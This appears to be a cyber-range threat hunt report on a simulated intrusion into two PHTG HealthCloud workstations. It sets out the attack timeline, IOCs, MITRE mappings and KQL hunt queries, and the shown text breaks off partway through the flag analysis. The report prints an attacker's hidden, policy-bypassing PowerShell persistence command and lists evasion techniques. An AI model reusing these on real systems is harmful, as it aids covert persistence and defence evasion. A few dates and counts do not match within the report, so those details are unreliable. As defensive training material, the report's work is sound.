

---

> **Classification:** `TLP:AMBER — CONFIDENTIAL`
> **Report ID:** `IR-2025-1213-PHTG`
> **Analyst:** `Károly Mathe`
> **Date:** `2025-12-13`
> **Version:** `1.0`

---

# 🛡️ Threat Hunt Report — Signals After the Noise 2

## PHTG HealthCloud // Post-Intrusion Investigation

---

## 📌 Executive Summary

The PHTG HealthCloud environment was the subject of a targeted post-intrusion investigation on 13 December 2025. An operator with pre-obtained credentials accessed the internal workstation `azwks-phtg-01` via RDP at 09:48 UTC and conducted a methodical, day-long campaign that included persistence installation, credential theft, defensive evasion, and double-extortion ransomware deployment. Nearly all activity was disguised as routine administration, with the attacker's tooling staged under a folder named after the victim organisation itself.

The operator demonstrated a high degree of operational discipline — probing for antivirus activity before deploying tools, using Base64-encoded C2 beacons to evade string-based detection, temporarily removing Defender exclusions to avoid artefact persistence, and chaining payloads through `cmd.exe` to break process lineage. LSASS memory was accessed with full `PROCESS_ALL_ACCESS` rights, confirming credential theft. Employee records were exfiltrated and ransomware was staged for deployment.

A second machine, `azwks-phtg-02`, was accessed from an external IP at 23:50 UTC — hours after the primary session — using credentials likely harvested during the morning session on phtg-01.

### 🔑 Key Findings at a Glance

| Category | Detail |
|----------|--------|
| 🔴 **Risk Rating** | CRITICAL |
| ⏱️ **Attacker Dwell Time** | ~14 hours (09:48 – 23:50 UTC) |
| 🖥️ **Systems Compromised** | 2 — azwks-phtg-01, azwks-phtg-02 |
| 👤 **Account Used** | vmadminusername (credential reuse) |
| 📦 **Data Exfiltrated** | Employee records — employee-data-*.csv |
| 🔑 **Credentials Exposed** | All active domain credentials (LSASS dump) |
| 🌐 **C2 Infrastructure** | health-cloud.cc (updates + status subdomains) |
| 🕵️ **Staging Root** | C:\ProgramData\PHTG\HealthCloud\ |
| 📋 **Breach Notification Required** | YES — employee data exfiltrated |

---

## 🎯 Hunt Objectives

- Reconstruct post-intrusion operator activity across the PHTG HealthCloud estate
- Identify all persistence mechanisms installed during the operator session
- Map C2 infrastructure and outbound communication channels
- Confirm credential access and assess scope of credential theft
- Document all attacker tools, techniques, and staging locations
- Correlate all behaviour to MITRE ATT&CK for detection engineering

---

## 🧭 Scope & Environment

| Field | Detail |
|-------|--------|
| **Platform** | Microsoft Sentinel (Azure Log Analytics) |
| **Workspace** | LAW-Cyber-Range |
| **Tables Used** | DeviceProcessEvents, DeviceNetworkEvents, DeviceLogonEvents, DeviceFileEvents, DeviceRegistryEvents, DeviceEvents, DeviceInfo |
| **Log Source** | Microsoft Defender for Endpoint (MDE) |
| **Hosts In Scope** | azwks-phtg-01 (Windows 10), azwks-phtg-02 (Windows 10) |
| **Primary Window** | 2025-12-13 09:48:40 UTC → 2025-12-13 23:59:59 UTC |
| **Anchor Event** | vmadminusername RDP logon to azwks-phtg-01 at 09:48:40 UTC |
| **Hunt Triggered By** | Post-intrusion referral — initial access established by Hunt 03 |
| **Note** | Initial access vector pre-confirmed. This hunt covers operator activity after access. |

---

## 📚 Table of Contents

- [📌 Executive Summary](#-executive-summary)
- [🎯 Hunt Objectives](#-hunt-objectives)
- [🧭 Scope & Environment](#-scope--environment)
- [🧠 Hunt Overview](#-hunt-overview)
- [⏱️ Attack Timeline](#️-attack-timeline)
- [👤 Attacker Profile](#-attacker-profile)
- [🔴 IOC Summary](#-ioc-summary)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [Phase 01 — Cold Trail](#phase-01--cold-trail)
  - [Phase 02 — First Footsteps](#phase-02--first-footsteps)
  - [Phase 03 — Quiet Roots](#phase-03--quiet-roots)
  - [Phase 04 — The Beacon Pair](#phase-04--the-beacon-pair)
  - [Phase 05 — Outbound Whispers](#phase-05--outbound-whispers)
  - [Phase 06 — Doors Held Open](#phase-06--doors-held-open)
  - [Phase 07 — Hands on the Vault](#phase-07--hands-on-the-vault)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🛠️ Remediation & Containment Checklist](#️-remediation--containment-checklist)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

The initial access vector for this intrusion had already been established by Hunt 03 — credential reuse (T1078). An operator holding valid credentials for `vmadminusername` authenticated via RDP to `azwks-phtg-01` at 09:48 UTC from an internal IP address (`10.0.0.152`), indicating a prior foothold elsewhere in the network. No failed logon attempts preceded the successful authentication, confirming the operator walked straight in without brute force. No onward lateral movement from phtg-01 was detected — the machine was used as an operational base, not a jump point.

Within minutes of landing, the operator executed a hidden PowerShell script (`_.ps1`) using the classic attacker combination of `-WindowStyle Hidden` and `-ExecutionPolicy Bypass`. The staging root — `C:\ProgramData\PHTG\HealthCloud\` — was deliberately named to mimic a legitimate healthcare application, blending the attacker's tooling into what appeared to be installed enterprise software. Artefacts inside this directory were immediately hidden using `attrib +h +s`, and Windows Defender was surgically excluded from scanning key paths and processes.

The operator established three persistence mechanisms — a Run key entry, a Startup folder LNK file, and a Windows Event Log source registration — and deployed a LOLBin (`PHTGHealthCloudSvc.exe`) masquerading as `bitsadmin.exe` that ran 22 `/healthcheck` loops throughout the session. C2 communication was conducted via two encoded beacons to `health-cloud.cc` subdomains, with Base64 encoding used to conceal the endpoints from string-based detection. In the evening, a double-extortion ransomware toolkit was downloaded and staged — pwncrypt for encryption, exfiltratedata for employee record theft. LSASS memory was accessed with `PROCESS_ALL_ACCESS` rights at 10:17 UTC, confirming credential theft early in the session. At 23:50 UTC, the operator returned from an external IP to access `azwks-phtg-02`, completing a day-long campaign that was almost entirely indistinguishable from routine administration.

---

## ⏱️ Attack Timeline

![[Hunt Timeline by Karoly.png]]

| Timestamp (UTC) | Host | Action | MITRE |
|----------------|------|--------|-------|
| 2025-12-13 09:48:40 | azwks-phtg-01 | RDP logon from 10.0.0.152 — vmadminusername — credential reuse | T1078 |
| 2025-12-13 10:11:43 | azwks-phtg-01 | _.ps1 executed — -WindowStyle Hidden -ExecutionPolicy Bypass | T1059.001 |
| 2025-12-13 10:11:43 | azwks-phtg-01 | attrib +h +s applied to TempCache (x3) and Cache (x13) directories | T1564.001 |
| 2025-12-13 10:11:42 | azwks-phtg-01 | Temporary Defender exclusion: C:\Users\vmAdminUsername\Documents\PHTG — add, execute, remove | T1562.001 |
| 2025-12-13 10:12:16 | azwks-phtg-01 | Encoded beacon to updates.health-cloud.cc — tool staging C2 | T1071.001 |
| 2025-12-13 10:12:17 | azwks-phtg-01 | Run key persistence written — PHTGHealthCloudTray | T1547.001 |
| 2025-12-13 10:12:18 | azwks-phtg-01 | Defender path exclusion: C:\ProgramData\PHTG\HealthCloud\Cache | T1562.001 |
| 2025-12-13 10:12:27 | azwks-phtg-01 | PHTGHealthCloudSvc.exe begins /healthcheck loop (22 total) | T1036.005 |
| 2025-12-13 10:13:16 | azwks-phtg-01 | Encoded beacon to status.health-cloud.cc — /checkin + /status | T1071.001 |
| 2025-12-13 10:14:10 | azwks-phtg-01 | amsi_probe.ps1 executed — AV scanning interface tested | T1562.001 |
| 2025-12-13 10:14:30 | azwks-phtg-01 | Defender process exclusion: PHTGHealthCloudSvc.exe | T1562.001 |
| 2025-12-13 10:14:37 | azwks-phtg-01 | LSASS OpenProcess — DesiredAccess 5136 → 2047999 (PROCESS_ALL_ACCESS) | T1003.001 |
| 2025-12-13 10:15:13 | azwks-phtg-01 | Startup LNK placed — PHTG HealthCloud.lnk | T1547.001 |
| 2025-12-13 10:15:25 | azwks-phtg-01 | Event log source registered — HKLM\...\EventLog\Application\PHTGHealthCloud | T1562.002 |
| 2025-12-13 10:17:36 | azwks-phtg-01 | ReadProcessMemoryApiCall — 1,883,128 bytes read from LSASS | T1003.001 |
| 2025-12-13 20:12:42 | azwks-phtg-01 | pwncrypt.ps1 downloaded and executed — ransomware deployment | T1486 |
| 2025-12-13 20:24:55 | azwks-phtg-01 | eicar.ps1 executed — AV detection check | T1562.001 |
| 2025-12-13 20:36:50 | azwks-phtg-01 | portscan.ps1 executed — internal network mapping | T1046 |
| 2025-12-13 20:48:44 | azwks-phtg-01 | exfiltratedata.ps1 + 7-Zip — employee records archived and exfiltrated | T1567 |
| 2025-12-13 23:50:49 | azwks-phtg-02 | RDP from external IP 173.244.55.128 — vmadminusername | T1078 |

---

## 👤 Attacker Profile

| Attribute | Detail |
|-----------|--------|
| **Account Used** | vmadminusername |
| **Entry IP (morning)** | 10.0.0.152 (internal — prior foothold implied) |
| **Entry IP (evening)** | 173.244.55.128 (external — operator's own machine) |
| **C2 Infrastructure** | updates.health-cloud.cc / status.health-cloud.cc |
| **Staging Root** | C:\ProgramData\PHTG\HealthCloud\ |
| **Tools Deployed** | pwncrypt.ps1, eicar.ps1, portscan.ps1, exfiltratedata.ps1, 7-Zip |
| **LOLBin Used** | PHTGHealthCloudSvc.exe (masquerading as bitsadmin.exe) |
| **Encoding** | Base64 (-EncodedCommand) for C2 beacon endpoints |
| **Approach** | Living-off-the-land — PowerShell, cmd.exe, attrib, native tools |
| **Targeting** | Targeted — victim org name used in staging path and C2 domain |
| **Sophistication** | High — AMSI probing, temporary exclusions, lineage breaking, dual C2 |
| **Objective** | Double-extortion ransomware — encrypt + exfiltrate employee records |

### 🔍 Operational Discipline Observed
- AMSI probed before deploying destructive tools — checked the coast was clear
- Temporary Defender exclusion added, used, and removed in a single command string
- cmd.exe used as intermediary to break PowerShell process lineage
- C2 endpoints Base64-encoded to evade string-based log detection
- Staging directory named after victim organisation to blend in
- Event log source registered to blend operator activity into Application log

---

## 🔴 IOC Summary

### 🌐 Network Indicators

| Type | Indicator | Context | Action |
|------|-----------|---------|--------|
| Domain | updates.health-cloud.cc | C2 — tool staging and ingress | BLOCK |
| Domain | status.health-cloud.cc | C2 — beacon check-in and status | BLOCK |
| IP | 10.0.0.152 | Source of morning RDP to phtg-01 — prior foothold | INVESTIGATE |
| IP | 173.244.55.128 | External RDP to phtg-02 — attacker's own machine | BLOCK |

### 📁 File Indicators

| File | Path | Role |
|------|------|------|
| _.ps1 | C:\Users\vmAdminUsername\Documents\PHTG\_.ps1 | Initial operator script |
| PHTGHealthCloudSvc.exe | C:\ProgramData\PHTG\HealthCloud\ | LOLBin — masquerades as bitsadmin.exe |
| HealthCloudTray.ps1 | C:\ProgramData\PHTG\HealthCloud\Bin\ | Persistence payload |
| amsi_probe.ps1 | C:\ProgramData\PHTG\HealthCloud\Bin\ | AV evasion probe |
| pwncrypt.ps1 | C:\ProgramData\pwncrypt.ps1 | Ransomware encryption |
| exfiltratedata.ps1 | C:\ProgramData\exfiltratedata.ps1 | Data theft script |
| PHTG HealthCloud.lnk | C:\Users\vmAdminUsername\...\Startup\ | Startup persistence |

### 👤 Account Indicators

| Account | Status | Action Required |
|---------|--------|----------------|
| vmadminusername | Compromised — credential reuse confirmed | Password reset immediately |
| All domain accounts | LSASS dumped — all credentials at risk | Full domain credential review |

---

## 🧬 MITRE ATT&CK Summary

| # | Flag | Tactic | Technique ID | Technique Name | Priority |
|--:|------|--------|-------------|----------------|----------|
| Q01 | Credential Reuse | Initial Access | T1078 | Valid Accounts | 🔴 Critical |
| Q02 | Lateral Movement | Lateral Movement | T1021.001 | Remote Desktop Protocol | 🔴 Critical |
| Q03 | No Onward Pivot | Discovery | — | Absence of evidence confirmed | 🟡 Medium |
| Q04 | First Operator Script | Execution | T1059.001 | PowerShell | 🔴 Critical |
| Q05 | Concealment Flags | Defense Evasion | T1059.001 | PowerShell — Hidden Window | 🟠 High |
| Q06 | Staging Workspace | Defense Evasion | T1036.005 | Match Legitimate Name or Location | 🟠 High |
| Q07 | Attrib Concealment | Defense Evasion | T1564.001 | Hidden Files and Directories | 🟡 Medium |
| Q08 | LOLBin Masquerade | Defense Evasion | T1036.005 | Match Legitimate Name | 🔴 Critical |
| Q09 | Registry Volume | Defense Evasion | T1112 | Modify Registry | 🟡 Medium |
| Q10 | Run Key Persistence | Persistence | T1547.001 | Registry Run Keys / Startup Folder | 🔴 Critical |
| Q11 | Run Key Value Name | Persistence | T1547.001 | Registry Run Keys / Startup Folder | 🔴 Critical |
| Q12 | Run Key Command | Persistence | T1547.001 | Registry Run Keys / Startup Folder | 🔴 Critical |
| Q13 | Startup LNK | Persistence | T1547.001 | Registry Run Keys / Startup Folder | 🔴 Critical |
| Q14 | Event Log Registration | Defense Evasion | T1562.002 | Disable Windows Event Logging | 🟠 High |
| Q15 | Healthcheck Loop | Defense Evasion | T1036.005 | Masquerading | 🟠 High |
| Q16 | Encoded Beacons | Command & Control | T1071.001 | Application Layer Protocol: Web | 🔴 Critical |
| Q17 | Dual Channel Rationale | Command & Control | T1071.001 | Application Layer Protocol: Web | 🟠 High |
| Q18 | Deployment Pattern | Execution | T1105 | Ingress Tool Transfer | 🔴 Critical |
| Q19 | Outbound Domains | Command & Control | T1071.001 | Application Layer Protocol: Web | 🔴 Critical |
| Q20 | AMSI Probe | Defense Evasion | T1562.001 | Disable or Modify Tools | 🟠 High |
| Q21 | Lineage Break | Defense Evasion | T1059.003 | Windows Command Shell | 🟠 High |
| Q22 | Defender Tampering | Defense Evasion | T1562.001 | Disable or Modify Tools | 🔴 Critical |
| Q23 | Defender Detection Outcome | Defense Evasion | T1562.001 | Disable or Modify Tools | 🟡 Medium |
| Q24 | Temporary Exclusion | Defense Evasion | T1562.001 | Disable or Modify Tools | 🔴 Critical |
| Q25 | Startup Execution Validated | Persistence | T1547.001 | Boot or Logon Autostart | 🟠 High |
| Q26 | Event Log Source Purpose | Defense Evasion | T1562.002 | Disable Windows Event Logging | 🟠 High |
| Q27 | LSASS Access Anomaly | Credential Access | T1003.001 | OS Credential Dumping: LSASS | 🔴 Critical |
| Q28 | Access Right Escalation | Credential Access | T1003.001 | OS Credential Dumping: LSASS | 🔴 Critical |
| Q29 | Credential Dump Confirmed | Credential Access | T1003.001 | OS Credential Dumping: LSASS | 🔴 Critical |

---

## 🔍 Flag Analysis

_Flags grouped by investigation phase. Each phase corresponds to a chapter in the hunt brief._

---

### Phase 01 — Cold Trail


<details>
<summary>🚩 <strong>Q01 — Credential Reuse</strong> — <code>T1078</code> — 🔴 Critical</summary>

### 🎯 Objective
Determine the actual access vector — ruling out brute force and identifying what the operator had before they authenticated.

### 📌 Finding
The operator authenticated via RDP to `azwks-phtg-01` with no preceding failed logon attempts. One clean `RemoteInteractive` logon from an internal IP using `vmadminusername`. No spray pattern, no volume. The operator held valid credentials before they arrived.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | azwks-phtg-01 |
| **Timestamp** | 2025-12-13 09:48:40 UTC |
| **Account** | vmadminusername |
| **Logon Type** | RemoteInteractive (RDP) |
| **Source IP** | 10.0.0.152 (internal) |
| **Protocol** | Negotiate |
| **Failed attempts** | 0 |

### 💡 Why It Matters
Credential reuse means the attacker obtained valid credentials through a prior compromise — phishing, credential dump, or previous breach. No amount of password policy enforcement stops this if credentials are already stolen. The origin of those credentials (10.0.0.152) implies a prior foothold in the network not yet investigated.

### 🔧 KQL Query Used
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:48) .. datetime(2025-12-13 23:59))
| where DeviceName in ("azwks-phtg-01", "azwks-phtg-02")
| where LogonType == "RemoteInteractive"
| project TimeGenerated, DeviceName, AccountName, RemoteIP
| sort by TimeGenerated asc
```

### 🖼️ Screenshot
![[Screenshots/RDP logins.png]]

### 🛡️ Detection Recommendation
Alert on RDP logons from internal IPs outside business hours where no failed attempts precede success. Correlate with the originating machine's activity to find the prior foothold.

**MITRE Reference:** [T1078](https://attack.mitre.org/techniques/T1078/)

</details>

---

<details>
<summary>🚩 <strong>Q02 — Lateral Movement Summary</strong> — <code>T1021.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the lateral movement path into the PHTG estate — source IP, target host, account used.

### 📌 Finding
The operator moved laterally from `10.0.0.152` into `azwks-phtg-01` at 09:48 UTC using `vmadminusername` via RDP. This represents movement from a previously compromised internal machine to the PHTG workstation.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Account** | vmadminusername |
| **Source IP** | 10.0.0.152 |
| **Target Host** | azwks-phtg-01 |
| **Timestamp** | 2025-12-13 09:48:40 UTC |
| **Method** | RDP (RemoteInteractive) |

### 💡 Why It Matters
The source IP `10.0.0.152` is internal — meaning this machine is either compromised or is the attacker operating from within a trusted network segment. This represents the lateral movement chain and implies a broader compromise beyond the two PHTG machines investigated here.

### 🔧 KQL Query Used
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:48) .. datetime(2025-12-13 23:59))
| where DeviceName in ("azwks-phtg-01", "azwks-phtg-02")
| where ActionType == "LogonSuccess"
| where LogonType == "RemoteInteractive"
| project TimeGenerated, DeviceName, AccountName, RemoteIP
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
Alert on RDP logons between internal workstations — workstation-to-workstation RDP is rarely legitimate. Flag any `RemoteInteractive` logon where source and destination are both non-server hosts.

**MITRE Reference:** [T1021.001](https://attack.mitre.org/techniques/T1021/001/)

</details>

---

<details>
<summary>🚩 <strong>Q03 — Onward Movement Check</strong> — Negative Finding — 🟡 Medium</summary>

### 🎯 Objective
Determine whether the operator pivoted onward from phtg-01 using the secondary host IP (10.0.0.105) as source.

### 📌 Finding
No `DeviceLogonEvents` returned when filtering for `RemoteIP == "10.0.0.105"`. The operator did not use phtg-01 as a launch pad for further lateral movement.

### 🔍 Evidence
`DeviceLogonEvents` query for source IP 10.0.0.105 returned zero results across the full investigation window.

![[Screenshots/No onward pivoting.png]]

### 💡 Why It Matters
Absence of onward movement means phtg-01 was the operator's working base for the session — not a stepping stone. The evening RDP to phtg-02 (23:50 UTC) originated from an external IP, meaning the attacker left the network and returned externally rather than moving between hosts.

### 🔧 KQL Query Used
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:48) .. datetime(2025-12-13 23:59))
| where RemoteIP == "10.0.0.105"
| project TimeGenerated, AccountName, ActionType, DeviceName
| sort by TimeGenerated asc
```

</details>

---

### Phase 02 — First Footsteps


<details>
<summary>🚩 <strong>Q04 — First Operator Script</strong> — <code>T1059.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the first script the operator launched under their own account context after lateral movement.

### 📌 Finding
Within 23 minutes of landing on phtg-01, the operator executed a hidden PowerShell script from their Documents folder. The script path and flags confirm deliberate attacker behaviour — no legitimate admin hides their PowerShell window.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | azwks-phtg-01 |
| **Timestamp** | 2025-12-13 10:11:43 UTC |
| **Account** | vmadminusername |
| **Script** | C:\Users\vmAdminUsername\Documents\PHTG\_.ps1 |
| **Flags** | -WindowStyle Hidden -ExecutionPolicy Bypass |

![[Screenshots/First action on phtg-01.png]]

### 💡 Why It Matters
This is the operator's primary loader script — everything else in the session flows from this execution. The unusual script name (`_.ps1` — single underscore, easily overlooked) combined with hidden execution is a deliberate concealment choice.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where AccountName =~ "vmadminusername"
| where ProcessCommandLine has_any ("-WindowStyle Hidden", "-ExecutionPolicy Bypass")
| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
Alert on PowerShell processes combining `-WindowStyle Hidden` AND `-ExecutionPolicy Bypass`. Either flag alone has legitimate uses. Both together in the same command — investigate immediately.

**MITRE Reference:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)

</details>

---

<details>
<summary>🚩 <strong>Q05 — Operator Concealment Flags</strong> — <code>T1059.001</code> — 🟠 High</summary>

### 🎯 Objective
Identify the two PowerShell flags that signal operator intent in the Q04 script invocation.

### 📌 Finding
The operator script was invoked with `-WindowStyle Hidden` and `-ExecutionPolicy Bypass` — the standard attacker PowerShell concealment combination.

| Flag | Purpose |
|------|---------|
| `-WindowStyle Hidden` | No console window visible to any user on screen |
| `-ExecutionPolicy Bypass` | Overrides Windows script security — runs unsigned scripts |

### 💡 Why It Matters
A legitimate administrator running a script has no reason to hide the window or bypass execution policy. These two flags together are a near-universal indicator of malicious PowerShell usage and should be treated as a detection primitive in any SIEM.

### 🛡️ Detection Rule
```
IF ProcessCommandLine contains "-WindowStyle Hidden"
AND ProcessCommandLine contains "-ExecutionPolicy Bypass"
THEN ALERT HIGH
```

**MITRE Reference:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)

</details>

---

<details>
<summary>🚩 <strong>Q06 — Operator Tooling Workspace</strong> — <code>T1036.005</code> — 🟠 High</summary>

### 🎯 Objective
Identify the root staging directory under ProgramData where the operator staged their tooling.

### 📌 Finding
The operator staged all tooling under `C:\ProgramData\PHTG\HealthCloud\` — a path deliberately named to mimic a legitimate installed healthcare application. Three subdirectories were identified: `Bin\`, `Cache\`, and `TempCache\`.

![[Screenshots/Searching for PHTG.png]]

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Staging Root** | C:\ProgramData\PHTG\HealthCloud\ |
| **Subdirectory 1** | Bin\ — executable payloads |
| **Subdirectory 2** | Cache\ — hidden flag files and task scripts |
| **Subdirectory 3** | TempCache\ — temporary working files |

### 💡 Why It Matters
`C:\ProgramData\` is a legitimate location for installed application data. By naming the folder after the victim organisation, the operator's staging directory would pass a casual inspection. Any analyst seeing `C:\ProgramData\PHTG\HealthCloud\` would likely assume it belongs to a legitimate product.

### 🔧 KQL Query Used
```kql
DeviceFileEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where FolderPath contains "PHTG"
| extend Directory = extract(@"(.*\\)", 1, FolderPath)
| distinct Directory
| sort by Directory asc
```

**MITRE Reference:** [T1036.005](https://attack.mitre.org/techniques/T1036/005/)

</details>

---

<details>
<summary>🚩 <strong>Q07 — Concealment Pattern</strong> — <code>T1564.001</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the two staging directories that received the bulk of attribute hiding, the count of modifications, and which was treated more heavily.

### 📌 Finding
The operator used `attrib +h +s` to hide artefacts in two subdirectories. `Cache` received 13 attribute modifications (FLAG files hidden individually). `TempCache` received 3 modifications (folder, .tmp file, Diag subfolder). Cache received the heavier treatment.

### 🔍 Evidence

| Directory | Modifications | Detail |
|-----------|--------------|--------|
| TempCache | 3 | Folder + healthcloud.tmp + Diag subfolder |
| Cache | 13 | FLAG-01 through FLAG-17 files hidden individually |

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where ProcessCommandLine contains "attrib"
| where ProcessCommandLine contains "+h" or ProcessCommandLine contains "+s"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1564.001](https://attack.mitre.org/techniques/T1564/001/)

</details>

---

### Phase 03 — Quiet Roots


<details>
<summary>🚩 <strong>Q08 — LOLBin Masquerade Identification</strong> — <code>T1036.005</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the one process among legitimate FileName/OriginalFileName mismatches that represents attacker tooling.

### 📌 Finding
`PHTGHealthCloudSvc.exe` running from `C:\ProgramData\PHTG\HealthCloud\` claimed an `OriginalFileName` of `bitsadmin.exe`. The attacker renamed their malicious binary to appear as a legitimate health cloud service but failed to update the internal binary metadata — the binary's own header still identifies it as `bitsadmin.exe`.

![[Screenshots/LOLBin masquerade as bitsadmin.exe.png]]

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **FileName on disk** | PHTGHealthCloudSvc.exe |
| **OriginalFileName (internal)** | bitsadmin.exe |
| **Path** | C:\ProgramData\PHTG\HealthCloud\ |
| **Separation from noise** | Non-system path; bitsadmin.exe has no legitimate reason to run from ProgramData |

### 💡 Why It Matters
`bitsadmin.exe` is a known Windows LOLBin used legitimately for file transfers via BITS — but frequently abused by attackers for stealthy downloads. By disguising their tool as bitsadmin, the attacker leverages the trust that built-in Windows tools receive from security tools. The non-system path is the giveaway.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where isnotempty(ProcessVersionInfoOriginalFileName)
| where FileName != ProcessVersionInfoOriginalFileName
| where FolderPath has_any ("ProgramData", "Public", "Users\\vmAdminUsername\\Documents")
| project TimeGenerated, FileName, ProcessVersionInfoOriginalFileName, FolderPath
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1036.005](https://attack.mitre.org/techniques/T1036/005/)

</details>

---

<details>
<summary>🚩 <strong>Q09 — Registry Activity Volume</strong> — <code>T1112</code> — 🟡 Medium</summary>

### 🎯 Objective
Count registry modification events fired under vmadminusername on phtg-01 after the anchor logon.

### 📌 Finding
**280** registry modification events were recorded under `vmadminusername` post-anchor. The vast majority represent Desktop themes, MUI cache, and COM CLSID re-registration — normal Windows user-session churn. The signal sits inside the noise.

### 🔧 KQL Query Used
```kql
DeviceRegistryEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated > datetime(2025-12-13T09:48:40Z)
| where InitiatingProcessAccountName =~ "vmadminusername"
| summarize count()
```

**MITRE Reference:** [T1112](https://attack.mitre.org/techniques/T1112/)

</details>

---

<details>
<summary>🚩 <strong>Q10 — Persistence Signal Isolation</strong> — <code>T1547.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Filter registry noise and identify the key path that actually matters for persistence.

### 📌 Finding
By filtering for attacker-initiated processes (PowerShell, cmd.exe, PHTGHealthCloudSvc.exe), the persistence signal isolated to `HKEY_CURRENT_USER\S-1-5-21-1521579525-3948531162-803360686-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — the classic Windows logon persistence key. The SID ending in **500** identifies this as the built-in Administrator account.

![[Screenshots/Persistence in registry.png]]

### 🔧 KQL Query Used
```kql
DeviceRegistryEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated > datetime(2025-12-13T09:48:40Z)
| where InitiatingProcessAccountName =~ "vmadminusername"
| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe", "PHTGHealthCloudSvc.exe")
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/)

</details>

---

<details>
<summary>🚩 <strong>Q11 — Run Key Value Name</strong> — <code>T1547.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the operator's Run key value name among legitimate entries like Edge auto-launch.

### 📌 Finding
The operator's Run key value name is `PHTGHealthCloudTray` — crafted to appear as a system tray application for the PHTG HealthCloud software.

| Field | Value |
|-------|-------|
| **Registry Key** | HKCU\...\CurrentVersion\Run |
| **Value Name** | PHTGHealthCloudTray |

**MITRE Reference:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/)

</details>

---

<details>
<summary>🚩 <strong>Q12 — Run Key Persistence Command</strong> — <code>T1547.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Recover the full command the operator configured to run at user logon.

### 📌 Finding
```
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"
```

Four flags used: `-NoProfile` (no user profile loaded, faster and stealthier), `-WindowStyle Hidden` (invisible), `-ExecutionPolicy Bypass` (no script security), `-File` (execute specific script).

### 💡 Why It Matters
This command fires every time `vmadminusername` logs in. It runs hidden, loads no user profile, and bypasses script security — a fully silent persistent execution that survives reboots.

**MITRE Reference:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/)

</details>

---

<details>
<summary>🚩 <strong>Q13 — Second Persistence Mechanism</strong> — <code>T1547.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the second persistence mechanism in a Windows folder that runs at logon.

### 📌 Finding
`PHTG HealthCloud.lnk` was placed in the user's Startup folder — `C:\Users\vmAdminUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`. Any shortcut in this folder executes automatically at every user logon.

### 💡 Why It Matters
Two persistence mechanisms pointing at the same payload (HealthCloudTray.ps1) explains why it fired **twice** on 12/28 — four seconds apart. One from the Run key, one from the Startup LNK. Redundant persistence ensures the payload survives even if one mechanism is discovered and removed.

**MITRE Reference:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/)

</details>

---

<details>
<summary>🚩 <strong>Q14 — Third Persistence Mechanism</strong> — <code>T1562.002</code> — 🟠 High</summary>

### 🎯 Objective
Identify the HKLM registry change that grants the operator's tooling a capability rather than simple persistence.

### 📌 Finding
The operator registered a custom Windows Application Event Log source at `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud`. This is not persistence in the run-at-logon sense — it grants the operator's tooling the ability to write entries into the Windows Application Event Log as a trusted source.

![[Screenshots/Reg tool for Windows Event Log.png]]

### 💡 Why It Matters
Registering as an Application Event Log source allows the attacker's tools to blend their output into legitimate application log entries — an area that receives far less scrutiny than the Security Event Log. Defenders hunting for attacker activity in the Security log would miss events deliberately written to the Application log by trusted-looking source `PHTGHealthCloud`.

### 🔧 KQL Query Used
```kql
DeviceRegistryEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where RegistryKey contains "HKEY_LOCAL_MACHINE"
| where InitiatingProcessAccountName =~ "vmadminusername"
| project TimeGenerated, RegistryKey, RegistryValueName, InitiatingProcessFileName
| sort by TimeGenerated asc
```

